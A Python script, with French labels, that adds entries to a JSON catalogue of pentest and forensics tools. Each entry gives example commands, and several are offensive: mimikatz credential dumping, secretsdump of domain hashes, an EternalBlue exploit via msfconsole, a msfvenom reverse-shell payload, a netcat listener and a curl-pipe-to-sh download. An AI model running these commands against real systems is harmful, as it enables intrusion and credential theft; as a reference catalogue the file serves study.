#!/usr/bin/env python3
import json
import os

# Nouvelles commandes à ajouter
new_commands = [
    {
        "nom": "powershell",
        "description": "Shell Windows avec capacités scripting avancées",
        "categorie": "Shell & Scripting",
        "plateforme": "Windows",
        "arguments_options": "-ExecutionPolicy, -EncodedCommand, -File, -Command, -NoProfile",
        "exemple": "powershell.exe -ExecutionPolicy Bypass -File script.ps1",
        "usage": "Exécuter des scripts PowerShell pour l'administration et le pentesting Windows",
        "tags": "windows, scripting, automation, exploitation",
        "niveau": "Intermédiaire",
        "ressources": "https://docs.microsoft.com/powershell"
    },
    {
        "nom": "Get-Process",
        "description": "Liste les processus Windows actifs",
        "categorie": "Surveillance système",
        "plateforme": "Windows",
        "arguments_options": "-Name, -Id, -IncludeUserName",
        "exemple": "Get-Process | Where-Object {$_.CPU -gt 100}",
        "usage": "Identifier les processus suspects consommant des ressources",
        "tags": "windows, processus, surveillance, investigation",
        "niveau": "Débutant",
        "ressources": "https://docs.microsoft.com/powershell"
    },
    {
        "nom": "Get-NetTCPConnection",
        "description": "Affiche les connexions réseau TCP actives",
        "categorie": "Réseau",
        "plateforme": "Windows",
        "arguments_options": "-State, -LocalAddress, -RemoteAddress, -OwningProcess",
        "exemple": "Get-NetTCPConnection -State Established | Select LocalAddress,RemoteAddress,State",
        "usage": "Détecter les connexions suspectes ou backdoors",
        "tags": "windows, réseau, connexion, surveillance",
        "niveau": "Intermédiaire",
        "ressources": "https://docs.microsoft.com/powershell"
    },
    {
        "nom": "mimikatz",
        "description": "Outil d'extraction de credentials Windows",
        "categorie": "Post-exploitation",
        "plateforme": "Windows",
        "arguments_options": "sekurlsa::logonpasswords, lsadump::sam, kerberos::golden",
        "exemple": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
        "usage": "Extraire les mots de passe en mémoire lors d'un pentest",
        "tags": "windows, credentials, post-exploitation, privilege-escalation",
        "niveau": "Avancé",
        "ressources": "https://github.com/gentilkiwi/mimikatz"
    },
    {
        "nom": "bloodhound",
        "description": "Cartographie les relations Active Directory",
        "categorie": "Active Directory",
        "plateforme": "Windows, Linux",
        "arguments_options": "--CollectionMethod All, -c All, -d domain.com",
        "exemple": "bloodhound-python -d domain.com -u user -p password -ns 10.0.0.1 -c All",
        "usage": "Identifier les chemins d'attaque dans Active Directory",
        "tags": "active-directory, reconnaissance, lateral-movement, windows",
        "niveau": "Avancé",
        "ressources": "https://github.com/BloodHoundAD/BloodHound"
    },
    {
        "nom": "enum4linux",
        "description": "Énumération d'informations depuis des systèmes Windows/Samba",
        "categorie": "Énumération",
        "plateforme": "Linux",
        "arguments_options": "-a (tout), -U (users), -S (shares), -G (groups), -P (password policy)",
        "exemple": "enum4linux -a 192.168.1.10",
        "usage": "Collecter des informations sur un domaine Windows depuis Linux",
        "tags": "enumeration, smb, windows, reconnaissance",
        "niveau": "Intermédiaire",
        "ressources": "https://github.com/CiscoCXSecurity/enum4linux"
    },
    {
        "nom": "responder",
        "description": "Outil de poisoning LLMNR, NBT-NS et MDNS",
        "categorie": "Man-in-the-Middle",
        "plateforme": "Linux",
        "arguments_options": "-I (interface), -w (WPAD), -r (resolve), -f (fingerprint)",
        "exemple": "responder -I eth0 -wrf",
        "usage": "Capturer des hashes NTLM en empoisonnant les requêtes réseau",
        "tags": "mitm, ntlm, hash, network-attack",
        "niveau": "Avancé",
        "ressources": "https://github.com/lgandx/Responder"
    },
    {
        "nom": "crackmapexec",
        "description": "Framework d'exploitation post-exploitation Active Directory",
        "categorie": "Post-exploitation",
        "plateforme": "Linux",
        "arguments_options": "smb, winrm, mssql, ldap, ssh",
        "exemple": "crackmapexec smb 192.168.1.0/24 -u admin -p password --shares",
        "usage": "Tester et exploiter les services Windows à grande échelle",
        "tags": "active-directory, lateral-movement, exploitation, windows",
        "niveau": "Avancé",
        "ressources": "https://github.com/byt3bl33d3r/CrackMapExec"
    },
    {
        "nom": "impacket-secretsdump",
        "description": "Dump les secrets NTDS, SAM et LSA",
        "categorie": "Post-exploitation",
        "plateforme": "Linux",
        "arguments_options": "-just-dc, -just-dc-ntlm, -just-dc-user",
        "exemple": "secretsdump.py domain/user:password@192.168.1.10",
        "usage": "Extraire tous les hashes d'un contrôleur de domaine",
        "tags": "active-directory, credentials, ntds, hash-dumping",
        "niveau": "Avancé",
        "ressources": "https://github.com/SecureAuthCorp/impacket"
    },
    {
        "nom": "john",
        "description": "John the Ripper - Cracker de mots de passe",
        "categorie": "Cracking",
        "plateforme": "Linux, Windows",
        "arguments_options": "--wordlist, --rules, --format, --show",
        "exemple": "john --wordlist=rockyou.txt --format=NT hashes.txt",
        "usage": "Cracker des hashes de mots de passe capturés",
        "tags": "cracking, password, hash, bruteforce",
        "niveau": "Intermédiaire",
        "ressources": "https://www.openwall.com/john/"
    },
    {
        "nom": "hashcat",
        "description": "Cracker de mots de passe GPU-acceleré",
        "categorie": "Cracking",
        "plateforme": "Linux, Windows",
        "arguments_options": "-m (hash-type), -a (attack-mode), -w (workload), -O (optimize)",
        "exemple": "hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt",
        "usage": "Cracker rapidement des hashes avec accélération GPU",
        "tags": "cracking, password, gpu, hash, bruteforce",
        "niveau": "Avancé",
        "ressources": "https://hashcat.net/hashcat/"
    },
    {
        "nom": "hydra",
        "description": "Outil de bruteforce de services réseau",
        "categorie": "Bruteforce",
        "plateforme": "Linux",
        "arguments_options": "-l (login), -L (login list), -p (password), -P (password list), -t (threads)",
        "exemple": "hydra -L users.txt -P passwords.txt ssh://192.168.1.10",
        "usage": "Tester la robustesse des mots de passe sur différents services",
        "tags": "bruteforce, password, network, attack",
        "niveau": "Intermédiaire",
        "ressources": "https://github.com/vanhauser-thc/thc-hydra"
    },
    {
        "nom": "sqlmap",
        "description": "Outil d'exploitation automatique des injections SQL",
        "categorie": "Web Exploitation",
        "plateforme": "Linux, Windows",
        "arguments_options": "-u (url), --dbs (databases), --tables, --dump, --os-shell",
        "exemple": "sqlmap -u 'http://site.com/page.php?id=1' --dbs",
        "usage": "Détecter et exploiter les vulnérabilités d'injection SQL",
        "tags": "web, sql-injection, exploitation, database",
        "niveau": "Avancé",
        "ressources": "https://sqlmap.org/"
    },
    {
        "nom": "burpsuite",
        "description": "Suite d'outils pour tester la sécurité des applications web",
        "categorie": "Web Testing",
        "plateforme": "Linux, Windows, macOS",
        "arguments_options": "Proxy, Scanner, Intruder, Repeater, Decoder",
        "exemple": "Configuration du proxy sur port 8080 et interception des requêtes",
        "usage": "Analyser et manipuler le trafic HTTP pour trouver des vulnérabilités",
        "tags": "web, proxy, interception, vulnerability-scanning",
        "niveau": "Intermédiaire",
        "ressources": "https://portswigger.net/burp"
    },
    {
        "nom": "nikto",
        "description": "Scanner de vulnérabilités pour serveurs web",
        "categorie": "Web Scanning",
        "plateforme": "Linux",
        "arguments_options": "-h (host), -p (port), -ssl, -Tuning",
        "exemple": "nikto -h http://192.168.1.10 -ssl",
        "usage": "Identifier les vulnérabilités et mauvaises configurations web",
        "tags": "web, scanning, vulnerability, reconnaissance",
        "niveau": "Débutant",
        "ressources": "https://cirt.net/Nikto2"
    },
    {
        "nom": "gobuster",
        "description": "Outil de bruteforce de répertoires et fichiers web",
        "categorie": "Web Enumeration",
        "plateforme": "Linux",
        "arguments_options": "dir (directories), dns (subdomains), vhost (virtual hosts)",
        "exemple": "gobuster dir -u http://site.com -w wordlist.txt -x php,html,txt",
        "usage": "Découvrir des ressources cachées sur un serveur web",
        "tags": "web, enumeration, bruteforce, reconnaissance",
        "niveau": "Débutant",
        "ressources": "https://github.com/OJ/gobuster"
    },
    {
        "nom": "ffuf",
        "description": "Fast web fuzzer écrit en Go",
        "categorie": "Web Fuzzing",
        "plateforme": "Linux, Windows",
        "arguments_options": "-u (url), -w (wordlist), -H (header), -X (method), -mc (match codes)",
        "exemple": "ffuf -u http://site.com/FUZZ -w wordlist.txt -mc 200,301,302",
        "usage": "Fuzzer rapidement des paramètres, headers, et chemins web",
        "tags": "web, fuzzing, bruteforce, reconnaissance",
        "niveau": "Intermédiaire",
        "ressources": "https://github.com/ffuf/ffuf"
    },
    {
        "nom": "wpscan",
        "description": "Scanner de vulnérabilités WordPress",
        "categorie": "CMS Scanning",
        "plateforme": "Linux",
        "arguments_options": "--url, --enumerate (u,p,t), --passwords, --api-token",
        "exemple": "wpscan --url http://site.com --enumerate u,p,t --api-token YOUR_TOKEN",
        "usage": "Identifier les vulnérabilités dans les sites WordPress",
        "tags": "wordpress, cms, vulnerability, scanning",
        "niveau": "Débutant",
        "ressources": "https://wpscan.com/"
    },
    {
        "nom": "droopescan",
        "description": "Scanner pour Drupal, Joomla et autres CMS",
        "categorie": "CMS Scanning",
        "plateforme": "Linux",
        "arguments_options": "scan (drupal|joomla|wordpress|silverstripe|moodle)",
        "exemple": "droopescan scan drupal -u http://site.com",
        "usage": "Énumérer les plugins et versions de différents CMS",
        "tags": "cms, scanning, enumeration, vulnerability",
        "niveau": "Intermédiaire",
        "ressources": "https://github.com/droope/droopescan"
    },
    {
        "nom": "shodan",
        "description": "Moteur de recherche pour appareils connectés",
        "categorie": "OSINT",
        "plateforme": "Linux, Windows",
        "arguments_options": "search, host, count, download, myip",
        "exemple": "shodan search 'apache 2.4' country:US",
        "usage": "Découvrir des systèmes exposés et leurs vulnérabilités",
        "tags": "osint, reconnaissance, iot, scanning",
        "niveau": "Intermédiaire",
        "ressources": "https://www.shodan.io/"
    },
    {
        "nom": "amass",
        "description": "Framework OSINT et énumération de surface d'attaque",
        "categorie": "OSINT",
        "plateforme": "Linux, Windows, macOS",
        "arguments_options": "enum, intel, viz, track, db",
        "exemple": "amass enum -d example.com -active",
        "usage": "Découvrir tous les sous-domaines et assets d'une organisation",
        "tags": "osint, reconnaissance, subdomain, enumeration",
        "niveau": "Intermédiaire",
        "ressources": "https://github.com/OWASP/Amass"
    },
    {
        "nom": "subfinder",
        "description": "Outil de découverte de sous-domaines",
        "categorie": "OSINT",
        "plateforme": "Linux, Windows, macOS",
        "arguments_options": "-d (domain), -all, -recursive, -o (output)",
        "exemple": "subfinder -d example.com -all -o subdomains.txt",
        "usage": "Énumérer rapidement tous les sous-domaines d'un domaine",
        "tags": "osint, subdomain, reconnaissance, enumeration",
        "niveau": "Débutant",
        "ressources": "https://github.com/projectdiscovery/subfinder"
    },
    {
        "nom": "nuclei",
        "description": "Scanner de vulnérabilités basé sur des templates",
        "categorie": "Vulnerability Scanning",
        "plateforme": "Linux, Windows, macOS",
        "arguments_options": "-u (url), -l (list), -t (templates), -severity",
        "exemple": "nuclei -u http://site.com -t cves/ -severity high,critical",
        "usage": "Scanner automatiquement des centaines de vulnérabilités connues",
        "tags": "vulnerability, scanning, automation, cve",
        "niveau": "Intermédiaire",
        "ressources": "https://github.com/projectdiscovery/nuclei"
    },
    {
        "nom": "httpx",
        "description": "Outil rapide de découverte et analyse HTTP",
        "categorie": "Web Reconnaissance",
        "plateforme": "Linux, Windows, macOS",
        "arguments_options": "-l (list), -status-code, -title, -tech-detect, -follow-redirects",
        "exemple": "cat domains.txt | httpx -status-code -title -tech-detect",
        "usage": "Vérifier rapidement la disponibilité et technologies de nombreux sites",
        "tags": "web, reconnaissance, http, scanning",
        "niveau": "Débutant",
        "ressources": "https://github.com/projectdiscovery/httpx"
    },
    {
        "nom": "masscan",
        "description": "Scanner de ports ultra-rapide",
        "categorie": "Reconnaissance",
        "plateforme": "Linux",
        "arguments_options": "-p (ports), --rate (packets/sec), --banners, --exclude",
        "exemple": "masscan 10.0.0.0/8 -p80,443 --rate=10000",
        "usage": "Scanner rapidement de très larges plages d'adresses IP",
        "tags": "scanning, port-scanning, reconnaissance, network",
        "niveau": "Avancé",
        "ressources": "https://github.com/robertdavidgraham/masscan"
    },
    {
        "nom": "rustscan",
        "description": "Scanner de ports moderne et ultra-rapide",
        "categorie": "Reconnaissance",
        "plateforme": "Linux, Windows, macOS",
        "arguments_options": "-a (addresses), -p (ports), -b (batch-size), --ulimit",
        "exemple": "rustscan -a 192.168.1.0/24 -p 1-65535 -- -sV -sC",
        "usage": "Scanner rapidement tous les ports puis passer à nmap pour l'analyse",
        "tags": "scanning, port-scanning, reconnaissance, rust",
        "niveau": "Intermédiaire",
        "ressources": "https://github.com/RustScan/RustScan"
    },
    {
        "nom": "theHarvester",
        "description": "Collecteur d'informations OSINT (emails, sous-domaines)",
        "categorie": "OSINT",
        "plateforme": "Linux",
        "arguments_options": "-d (domain), -b (source), -l (limit), -f (output file)",
        "exemple": "theHarvester -d example.com -b all -f output.xml",
        "usage": "Collecter des emails et sous-domaines depuis sources publiques",
        "tags": "osint, reconnaissance, email, subdomain",
        "niveau": "Débutant",
        "ressources": "https://github.com/laramies/theHarvester"
    },
    {
        "nom": "recon-ng",
        "description": "Framework de reconnaissance web complet",
        "categorie": "OSINT",
        "plateforme": "Linux",
        "arguments_options": "modules, marketplace, show, search, use",
        "exemple": "recon-ng -w workspace_name",
        "usage": "Framework modulaire pour automatiser la reconnaissance",
        "tags": "osint, reconnaissance, framework, automation",
        "niveau": "Avancé",
        "ressources": "https://github.com/lanmaster53/recon-ng"
    },
    {
        "nom": "sherlock",
        "description": "Trouve des comptes utilisateur sur des réseaux sociaux",
        "categorie": "OSINT",
        "plateforme": "Linux, Windows, macOS",
        "arguments_options": "username, --timeout, --csv, --print-found",
        "exemple": "sherlock username --timeout 5 --csv",
        "usage": "Identifier les présences en ligne d'un utilisateur",
        "tags": "osint, social-media, reconnaissance, username",
        "niveau": "Débutant",
        "ressources": "https://github.com/sherlock-project/sherlock"
    },
    {
        "nom": "maltego",
        "description": "Plateforme OSINT et link analysis",
        "categorie": "OSINT",
        "plateforme": "Linux, Windows, macOS",
        "arguments_options": "Transforms, Machines, Entities, Graphs",
        "exemple": "Interface graphique pour cartographier les relations",
        "usage": "Visualiser et analyser les relations entre entités",
        "tags": "osint, graphique, analyse, intelligence",
        "niveau": "Avancé",
        "ressources": "https://www.maltego.com/"
    },
    {
        "nom": "spiderfoot",
        "description": "Outil OSINT automatisé",
        "categorie": "OSINT",
        "plateforme": "Linux, Windows, macOS",
        "arguments_options": "-s (target), -t (type), -m (modules), -o (output)",
        "exemple": "sf.py -s example.com -m all",
        "usage": "Collecter automatiquement des informations depuis 200+ sources",
        "tags": "osint, automation, reconnaissance, intelligence",
        "niveau": "Intermédiaire",
        "ressources": "https://github.com/smicallef/spiderfoot"
    },
    {
        "nom": "metasploit",
        "description": "Framework d'exploitation de vulnérabilités",
        "categorie": "Exploitation",
        "plateforme": "Linux, Windows",
        "arguments_options": "msfconsole, msfvenom, msfdb, search, use, set, exploit",
        "exemple": "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOST 10.0.0.1; exploit'",
        "usage": "Exploiter des vulnérabilités et obtenir un accès système",
        "tags": "exploitation, framework, pentesting, post-exploitation",
        "niveau": "Avancé",
        "ressources": "https://www.metasploit.com/"
    },
    {
        "nom": "msfvenom",
        "description": "Générateur de payloads Metasploit",
        "categorie": "Payload Generation",
        "plateforme": "Linux, Windows",
        "arguments_options": "-p (payload), -f (format), -e (encoder), -a (arch), -platform",
        "exemple": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe",
        "usage": "Créer des payloads malveillants pour différents systèmes",
        "tags": "payload, exploitation, meterpreter, reverse-shell",
        "niveau": "Avancé",
        "ressources": "https://www.offensive-security.com/metasploit-unleashed/msfvenom/"
    },
    {
        "nom": "nc (netcat)",
        "description": "Couteau suisse réseau pour lecture/écriture TCP/UDP",
        "categorie": "Réseau",
        "plateforme": "Linux, Windows",
        "arguments_options": "-l (listen), -p (port), -e (execute), -v (verbose), -n (no-dns)",
        "exemple": "nc -lvnp 4444",
        "usage": "Créer des reverse shells, transférer des fichiers, tester des ports",
        "tags": "network, shell, listener, file-transfer",
        "niveau": "Intermédiaire",
        "ressources": "https://nc110.sourceforge.io/"
    },
    {
        "nom": "socat",
        "description": "Utilitaire réseau avancé, version étendue de netcat",
        "categorie": "Réseau",
        "plateforme": "Linux",
        "arguments_options": "TCP, UDP, SSL, PROXY, SOCKS, SHELL",
        "exemple": "socat TCP-LISTEN:8080,reuseaddr,fork TCP:192.168.1.10:80",
        "usage": "Créer des relais, tunnels et shells chiffrés",
        "tags": "network, tunnel, relay, encryption",
        "niveau": "Avancé",
        "ressources": "http://www.dest-unreach.org/socat/"
    },
    {
        "nom": "chisel",
        "description": "Outil de tunneling TCP/UDP sur HTTP",
        "categorie": "Pivoting",
        "plateforme": "Linux, Windows",
        "arguments_options": "server, client, --reverse, --socks5, -v",
        "exemple": "chisel server -p 8080 --reverse && chisel client 10.0.0.1:8080 R:socks",
        "usage": "Créer des tunnels pour pivoter à travers des réseaux",
        "tags": "pivoting, tunnel, proxy, lateral-movement",
        "niveau": "Avancé",
        "ressources": "https://github.com/jpillora/chisel"
    },
    {
        "nom": "pwncat",
        "description": "Framework de reverse/bind shell amélioré",
        "categorie": "Post-exploitation",
        "plateforme": "Linux",
        "arguments_options": "-l (listen), -c (connect), -H (history), --upload, --download",
        "exemple": "pwncat-cs -l 4444",
        "usage": "Gérer des shells avec auto-complétion, upload/download et persistence",
        "tags": "shell, post-exploitation, reverse-shell, framework",
        "niveau": "Avancé",
        "ressources": "https://github.com/calebstewart/pwncat"
    },
    {
        "nom": "evil-winrm",
        "description": "Shell WinRM pour pentesting Windows",
        "categorie": "Remote Access",
        "plateforme": "Linux",
        "arguments_options": "-i (ip), -u (user), -p (password), -H (hash), -s (scripts)",
        "exemple": "evil-winrm -i 10.0.0.1 -u admin -p password",
        "usage": "Obtenir un shell PowerShell sur des machines Windows via WinRM",
        "tags": "windows, remote-access, winrm, post-exploitation",
        "niveau": "Intermédiaire",
        "ressources": "https://github.com/Hackplayers/evil-winrm"
    },
    {
        "nom": "smbclient",
        "description": "Client SMB pour accéder aux partages Windows",
        "categorie": "File Sharing",
        "plateforme": "Linux",
        "arguments_options": "-L (list), -U (user), -N (no password), -c (command)",
        "exemple": "smbclient //10.0.0.1/share -U username",
        "usage": "Accéder et manipuler des partages SMB/CIFS",
        "tags": "smb, windows, file-sharing, reconnaissance",
        "niveau": "Débutant",
        "ressources": "https://www.samba.org/samba/docs/current/man-html/smbclient.1.html"
    },
    {
        "nom": "smbmap",
        "description": "Énumération de partages SMB",
        "categorie": "Enumeration",
        "plateforme": "Linux",
        "arguments_options": "-H (host), -u (user), -p (password), -d (domain), -R (recursive)",
        "exemple": "smbmap -H 10.0.0.1 -u guest -R",
        "usage": "Lister et explorer les partages SMB accessibles",
        "tags": "smb, enumeration, windows, shares",
        "niveau": "Débutant",
        "ressources": "https://github.com/ShawnDEvans/smbmap"
    },
    {
        "nom": "rpcclient",
        "description": "Client RPC pour interroger les services Windows",
        "categorie": "Enumeration",
        "plateforme": "Linux",
        "arguments_options": "-U (user), -N (no password), -c (command)",
        "exemple": "rpcclient -U '' -N 10.0.0.1 -c 'enumdomusers'",
        "usage": "Énumérer utilisateurs, groupes et informations du domaine",
        "tags": "rpc, windows, enumeration, active-directory",
        "niveau": "Intermédiaire",
        "ressources": "https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html"
    },
    {
        "nom": "ldapsearch",
        "description": "Interroge les annuaires LDAP/Active Directory",
        "categorie": "Active Directory",
        "plateforme": "Linux",
        "arguments_options": "-x (simple auth), -H (host), -D (bind DN), -w (password), -b (base)",
        "exemple": "ldapsearch -x -H ldap://10.0.0.1 -D 'CN=admin,DC=domain,DC=com' -w password -b 'DC=domain,DC=com'",
        "usage": "Extraire des informations depuis Active Directory",
        "tags": "ldap, active-directory, enumeration, reconnaissance",
        "niveau": "Avancé",
        "ressources": "https://linux.die.net/man/1/ldapsearch"
    },
    {
        "nom": "kerbrute",
        "description": "Outil de bruteforce et énumération Kerberos",
        "categorie": "Active Directory",
        "plateforme": "Linux, Windows",
        "arguments_options": "userenum, passwordspray, bruteuser, bruteforce",
        "exemple": "kerbrute userenum -d domain.com --dc 10.0.0.1 users.txt",
        "usage": "Énumérer les utilisateurs valides via Kerberos pré-auth",
        "tags": "kerberos, active-directory, enumeration, bruteforce",
        "niveau": "Avancé",
        "ressources": "https://github.com/ropnop/kerbrute"
    },
    {
        "nom": "linpeas",
        "description": "Script d'énumération et escalade de privilèges Linux",
        "categorie": "Privilege Escalation",
        "plateforme": "Linux",
        "arguments_options": "-a (all checks), -s (superfast), -P (password)",
        "exemple": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
        "usage": "Identifier automatiquement les vecteurs d'escalade de privilèges",
        "tags": "linux, privilege-escalation, enumeration, post-exploitation",
        "niveau": "Intermédiaire",
        "ressources": "https://github.com/carlospolop/PEASS-ng"
    },
    {
        "nom": "winpeas",
        "description": "Script d'énumération et escalade de privilèges Windows",
        "categorie": "Privilege Escalation",
        "plateforme": "Windows",
        "arguments_options": "cmd, quiet, notcolor, searchpf",
        "exemple": "winPEASx64.exe",
        "usage": "Identifier automatiquement les failles de sécurité Windows",
        "tags": "windows, privilege-escalation, enumeration, post-exploitation",
        "niveau": "Intermédiaire",
        "ressources": "https://github.com/carlospolop/PEASS-ng"
    },
    {
        "nom": "pspy",
        "description": "Moniteur de processus sans privilèges root",
        "categorie": "Surveillance",
        "plateforme": "Linux",
        "arguments_options": "-p (print commands), -f (print file system events), -i (interval)",
        "exemple": "./pspy64 -pf -i 1000",
        "usage": "Surveiller les processus et cron jobs pour trouver des escalades",
        "tags": "linux, monitoring, privilege-escalation, enumeration",
        "niveau": "Intermédiaire",
        "ressources": "https://github.com/DominicBreuker/pspy"
    },
    {
        "nom": "gtfobins",
        "description": "Base de données de binaires Unix pour escalade de privilèges",
        "categorie": "Privilege Escalation",
        "plateforme": "Linux",
        "arguments_options": "N/A - Base de connaissances web",
        "exemple": "Consulter https://gtfobins.github.io/ pour find, vim, python, etc.",
        "usage": "Trouver comment exploiter des binaires SUID pour devenir root",
        "tags": "linux, privilege-escalation, suid, gtfobins",
        "niveau": "Intermédiaire",
        "ressources": "https://gtfobins.github.io/"
    },
    {
        "nom": "pwntools",
        "description": "Framework CTF et exploitation binaire",
        "categorie": "Binary Exploitation",
        "plateforme": "Linux",
        "arguments_options": "Python library: pwn, ELF, ROP, shellcraft",
        "exemple": "from pwn import *; r = remote('target.com', 1337); r.sendline(payload)",
        "usage": "Automatiser l'exploitation de binaires et challenges CTF",
        "tags": "ctf, exploitation, binary, rop, shellcode",
        "niveau": "Avancé",
        "ressources": "https://github.com/Gallopsled/pwntools"
    },
    {
        "nom": "gdb-peda",
        "description": "Extension Python pour GDB dédiée au reverse engineering",
        "categorie": "Reverse Engineering",
        "plateforme": "Linux",
        "arguments_options": "pattern, checksec, ropgadget, shellcode, telescope",
        "exemple": "gdb -q ./binary puis pattern_create 200",
        "usage": "Débugger et analyser des binaires avec des helpers d'exploitation",
        "tags": "gdb, debugging, reverse-engineering, exploitation",
        "niveau": "Avancé",
        "ressources": "https://github.com/longld/peda"
    },
    {
        "nom": "radare2",
        "description": "Framework de reverse engineering open-source",
        "categorie": "Reverse Engineering",
        "plateforme": "Linux, Windows, macOS",
        "arguments_options": "-d (debug), -A (analyze), -w (write), -c (commands)",
        "exemple": "r2 -AA binary puis afl (list functions), pdf @main (disasm)",
        "usage": "Analyser et débugger des binaires, désassembler du code",
        "tags": "reverse-engineering, disassembly, debugging, binary-analysis",
        "niveau": "Avancé",
        "ressources": "https://rada.re/"
    },
    {
        "nom": "ghidra",
        "description": "Suite de reverse engineering de la NSA",
        "categorie": "Reverse Engineering",
        "plateforme": "Linux, Windows, macOS",
        "arguments_options": "Interface graphique: Project, Tool, Decompiler, CodeBrowser",
        "exemple": "ghidraRun puis importer un binaire pour le décompiler",
        "usage": "Décompiler et analyser des binaires avec un décompileur puissant",
        "tags": "reverse-engineering, decompiler, binary-analysis, nsa",
        "niveau": "Avancé",
        "ressources": "https://ghidra-sre.org/"
    },
    {
        "nom": "binwalk",
        "description": "Outil d'analyse et extraction de firmware",
        "categorie": "Firmware Analysis",
        "plateforme": "Linux",
        "arguments_options": "-e (extract), -M (matryoshka), -B (signature scan), -E (entropy)",
        "exemple": "binwalk -Me firmware.bin",
        "usage": "Analyser et extraire des fichiers depuis des images firmware",
        "tags": "firmware, extraction, iot, reverse-engineering",
        "niveau": "Intermédiaire",
        "ressources": "https://github.com/ReFirmLabs/binwalk"
    },
    {
        "nom": "volatility",
        "description": "Framework d'analyse de mémoire forensique",
        "categorie": "Digital Forensics",
        "plateforme": "Linux, Windows",
        "arguments_options": "-f (file), --profile, pslist, pstree, netscan, filescan",
        "exemple": "volatility -f memory.dmp --profile=Win7SP1x64 pslist",
        "usage": "Analyser des dumps mémoire pour la forensique et l'IR",
        "tags": "forensics, memory-analysis, incident-response, malware",
        "niveau": "Avancé",
        "ressources": "https://github.com/volatilityfoundation/volatility"
    },
    {
        "nom": "autopsy",
        "description": "Plateforme forensique graphique",
        "categorie": "Digital Forensics",
        "plateforme": "Linux, Windows",
        "arguments_options": "Interface graphique pour analyse de disques et fichiers",
        "exemple": "Créer un cas, ajouter une source de données, lancer l'analyse",
        "usage": "Analyser des disques et fichiers dans des enquêtes forensiques",
        "tags": "forensics, disk-analysis, investigation, gui",
        "niveau": "Intermédiaire",
        "ressources": "https://www.autopsy.com/"
    },
    {
        "nom": "foremost",
        "description": "Outil de récupération de fichiers par file carving",
        "categorie": "Digital Forensics",
        "plateforme": "Linux",
        "arguments_options": "-t (types), -i (input), -o (output), -v (verbose)",
        "exemple": "foremost -t jpg,png,pdf -i disk.img -o recovered/",
        "usage": "Récupérer des fichiers supprimés depuis des images disque",
        "tags": "forensics, file-recovery, carving, investigation",
        "niveau": "Intermédiaire",
        "ressources": "http://foremost.sourceforge.net/"
    },
    {
        "nom": "exiftool",
        "description": "Lecteur/éditeur de métadonnées de fichiers",
        "categorie": "Metadata Analysis",
        "plateforme": "Linux, Windows, macOS",
        "arguments_options": "-a (all), -G (group), -r (recursive), -csv",
        "exemple": "exiftool -a -G image.jpg",
        "usage": "Extraire des métadonnées pour l'OSINT et la forensique",
        "tags": "metadata, exif, forensics, osint",
        "niveau": "Débutant",
        "ressources": "https://exiftool.org/"
    }
]

print(f"📊 Préparation de {len(new_commands)} nouvelles commandes...")

# Charger les commandes existantes
commands_file = "app/data/commands.json"
with open(commands_file, 'r', encoding='utf-8') as f:
    existing_commands = json.load(f)

print(f"✅ {len(existing_commands)} commandes existantes trouvées")

# Vérifier les doublons par nom
existing_names = {cmd['nom'].lower() for cmd in existing_commands}
new_unique_commands = [cmd for cmd in new_commands if cmd['nom'].lower() not in existing_names]

print(f"✅ {len(new_unique_commands)} nouvelles commandes uniques à ajouter")
print(f"⚠️  {len(new_commands) - len(new_unique_commands)} doublons ignorés")

# Ajouter les nouvelles commandes
existing_commands.extend(new_unique_commands)

# Sauvegarder
with open(commands_file, 'w', encoding='utf-8') as f:
    json.dump(existing_commands, f, ensure_ascii=False, indent=2)

print(f"✅ Fichier mis à jour: {len(existing_commands)} commandes au total")
print(f"📈 Gain: +{len(new_unique_commands)} commandes ({len(new_unique_commands)/len(existing_commands)*100:.1f}% d'augmentation)")
